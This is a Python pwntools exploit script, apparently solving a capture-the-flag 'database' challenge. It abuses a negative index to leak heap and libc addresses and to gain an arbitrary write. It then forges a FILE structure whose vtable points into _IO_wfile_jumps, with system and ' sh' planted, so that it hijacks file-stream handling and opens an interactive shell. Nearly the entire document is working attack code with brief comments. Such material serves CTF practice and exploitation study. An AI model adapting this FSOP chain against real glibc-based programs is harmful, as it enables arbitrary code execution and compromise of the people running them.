#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]

encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

exe = "./database_patched"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])
    ) if args.REMOTE else process(argv=[exe], aslr=False)
if args.GDB: gdb.attach(io, """
    b *fwrite+84
    b *_IO_wdoallocbuf+45
""")

def menu(idx, ln=True):
    sender = io.sendlineafter if ln else io.sendafter
    sender(b": ", encode(idx))

def add(menu_idx, _id, name, age, classes, ln=True):
    menu(menu_idx)
    menu(_id)
    menu(name, ln=ln)
    menu(age)
    menu(classes, ln=ln)

"""
We need to leak heap addresses
So we can get the address to file struct
"""
add(1, -10, "@thefll", 0, "pwn")
menu(2)
io.recvuntil(b": ")

heap = int(io.recvline())
info("heap @ %#x" % heap)
io_file = heap + 0x960 # start of the file struct
info("FILE Struct @ %#x" % io_file)

"""
Now, utilizing our add to create an arb-write primitive
"""
io.recvuntil(b"choice") # just cleaner output
add(1, -10, p64(io_file), 0, "pwn\x00")

"""
With the arb-write, we write data to index-0
which will print the contents of the file struct
eventually giving us a libc leak.
"""
add(1, 0, "AAAAAAAA", 0x0, "BBBBBBBB", ln=False)
menu(2)
io.recvuntil(b"BBBBBBBB")
libc.address = fixleak(io.recvline()) - 0x2044e0
info("libc @ %#x" % libc.address)

"""
FSOP
"""
info("libc.sym._IO_wfile_jumps @ %#x" % libc.sym._IO_wfile_jumps)
vtable = libc.sym._IO_wfile_jumps - 0x18 # _IO_wfile_overflow
info("vtable @ %#x" % vtable)

"""
# Payload using pwntools FileStructure:

fp = FileStructure(0)
fp.flags = unpack(b" sh".ljust(8, b"\x00"))
fp._fileno = (io_file+0x78)-0x68
fp._flags2 = libc.sym.system
fp._lock = libc.bss()+0x100
fp._codecvt = io_file+0x20
fp._wide_data = io_file-0x70
fp.vtable = vtable
payload = bytes(fp)
"""

payload = flat(
    unpack(b" sh".ljust(8, b"\x00")),
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
    (io_file+0x78)-0x68,
    libc.sym.system,
    0x0, libc.bss()+0x100, 0x0,
    io_file+0x20, io_file-0x70,
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
    vtable)

add(1, 0, payload[:0x50], 0x0, payload[0x60:], ln=False)
menu(3)

io.interactive()